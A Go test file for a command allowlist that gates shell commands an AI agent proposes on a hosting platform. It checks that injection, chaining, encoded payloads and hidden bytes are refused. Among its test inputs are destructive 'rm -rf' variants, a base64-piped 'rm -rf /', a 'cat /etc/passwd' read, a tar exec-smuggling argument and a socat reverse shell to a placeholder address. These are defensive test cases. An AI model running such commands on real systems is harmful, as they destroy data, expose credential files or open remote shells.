package agentexec

import (
	"testing"

	"hostbay/internal/store"
)

// With an entry for ls with any arguments, every one of these still asks:
// nothing that is not one simple command of plain literal words matches.
func TestMatcherFailsClosed(t *testing.T) {
	ls := []store.AllowEntry{{Argv: []string{"ls"}, Prefix: true}}
	if !Match("ls -l", []store.AllowEntry{{Argv: []string{"ls", "-l"}}}) || !Match("ls /var/log", ls) || !Match("ls", ls) {
		t.Fatal("plain ls did not match")
	}
	for _, cmd := range []string{
		"ls; rm x", "ls && rm -rf ~", "ls $(rm x)", "ls `x`", "ls > f", "ls *", "echo $HOME", "FOO=1 ls",
		"find / -delete", "xargs rm", "sh -c 'rm -rf /'", "echo cm0gLXJmIC8= | base64 -d | sh", "/bin/rm -rf /", `\rm -rf /`,
		"ls ~", "ls {a,b}", "ls -la", "ls 'x'", `ls a\ b`, "ls # comment", "ls &", "! ls", "(ls)", "ls x?",
		"ls\nrm x", "ls\trm", "ls ../x;", "",
	} {
		if Match(cmd, ls) {
			t.Errorf("%q matched", cmd)
		}
	}
}

// Options match only as written in the entry, and the preset's <unit>
// takes one plain argument.
func TestPrefixEntriesAndPlaceholders(t *testing.T) {
	tar := []store.AllowEntry{{Argv: []string{"tar", "-tzf"}, Prefix: true}}
	if !Match("tar -tzf x.tgz", tar) || Match("tar -tzf x --checkpoint-action=exec=sh", tar) || Match("tar -tzf", nil) {
		t.Fatal("tar prefix entry")
	}
	if !Match("systemctl status nginx", Preset) || Match("systemctl status -Hx nginx", Preset) || Match("systemctl status nginx extra", Preset) {
		t.Fatal("systemctl status <unit>")
	}
	if !Match("uptime", Preset) || !Match("df -h", Preset) || Match("df -h /", Preset) || Match("cat /etc/passwd", Preset) {
		t.Fatal("preset")
	}
}

// The editor refuses an entry that is not plain words, and a prefix entry
// whose program runs its arguments as code.
func TestEntryEditorRefusals(t *testing.T) {
	for _, c := range []struct {
		cmd    string
		prefix bool
	}{
		{"docker", true}, {"docker ps", true}, {"kubectl get", true}, {"python3 -m", true}, {"/usr/bin/env", true}, {"sudo ls", true},
		{"ls; rm", false}, {"echo $HOME", false}, {"", false}, {"rm -rf *", false},
	} {
		if _, err := ParseEntry(c.cmd, c.prefix); err == nil {
			t.Errorf("ParseEntry(%q, %v) accepted", c.cmd, c.prefix)
		}
	}
	e, err := ParseEntry("systemctl restart nginx", false)
	if err != nil || len(e.Argv) != 3 {
		t.Fatalf("entry = %+v, %v", e, err)
	}
	if _, err := ParseEntry("docker ps", false); err != nil {
		t.Fatalf("an exact docker entry: %v", err)
	}
}

// Each of these runs its arguments, or a command named in them, as code:
// a prefix entry for it is refused, and one saved before it was listed
// never matches, so `ip netns exec ns1 sh x` cannot ride an `ip` entry.
func TestProgramsThatRunTheirArgumentsNeverPrefixMatch(t *testing.T) {
	for _, prog := range []string{
		"setsid", "strace", "ltrace", "tmux", "screen", "npx", "pnpx", "bunx", "pwsh", "powershell", "csh", "tcsh", "ksh", "fish",
		"ip", "chroot", "unshare", "nsenter", "timeout", "nice", "nohup", "env", "xargs", "doas", "su", "runuser", "script",
		"expect", "watch", "flock", "time", "stdbuf", "ionice", "taskset", "chrt", "nodejs", "deno", "bun", "npm", "pnpm", "yarn",
		"pip", "pip3", "pip3.12", "cargo", "go", "java", "tclsh", "mksh", "ash", "pkexec", "parallel", "crontab", "at", "source",
		".", "builtin", "trap", "/usr/sbin/ip", "python3.12", "perl5.36",
		"socat", "ifne", "crictl", "ctr", "incus", "buildah", "k3s", "microk8s", "systemd-cat", "systemd-inhibit", "ssh-agent",
		"dbus-run-session", "dbus-launch", "xvfb-run", "run0", "setarch", "linux32", "linux64", "runcon", "faketime", "hyperfine",
		"srun", "salloc", "sbatch", "sem", "xcrun", "ld.so", "ld-linux-x86-64.so.2", "/lib64/ld-linux-x86-64.so.2",
	} {
		if _, err := ParseEntry(prog+" status", true); err == nil {
			t.Errorf("prefix entry %q accepted", prog)
		}
		saved := []store.AllowEntry{{Argv: []string{prog}, Prefix: true}}
		if Match(prog+" netns exec ns1 sh x", saved) {
			t.Errorf("saved prefix entry %q matched", prog)
		}
	}
	// socat's address words are plain literals, so a saved entry must not
	// let it open a shell.
	if Match("socat TCP:203.0.113.5:4444 EXEC:/bin/sh", []store.AllowEntry{{Argv: []string{"socat"}, Prefix: true}}) {
		t.Error("a saved socat prefix entry matched a reverse shell")
	}
	if _, err := ParseEntry("ip addr", false); err != nil {
		t.Fatalf("an exact ip entry: %v", err)
	}
	if !Match("ip addr", []store.AllowEntry{{Argv: []string{"ip", "addr"}}}) {
		t.Fatal("an exact ip entry did not match")
	}
	if !Match("journalctl -u nginx", []store.AllowEntry{{Argv: []string{"journalctl", "-u"}, Prefix: true}}) {
		t.Fatal("an ordinary prefix entry did not match")
	}
}

// What a card shows is what runs: control bytes, bidi overrides and
// zero-width characters are refused before anything else.
func TestProposalsWithHiddenBytesAreRefused(t *testing.T) {
	for _, s := range []string{"ls\n", "ls\rrm", "ls \x1b[2K", "ls \u202erm", "ls\u200b", "ls\x7f", "ls\u0085", "ls\t-l", "ls \ufeff"} {
		if err := CheckBytes(s); err == nil {
			t.Errorf("%q passed", s)
		}
	}
	if err := CheckBytes(`printf '%s\n' "it's" — ünïcode`); err != nil {
		t.Fatal(err)
	}
}
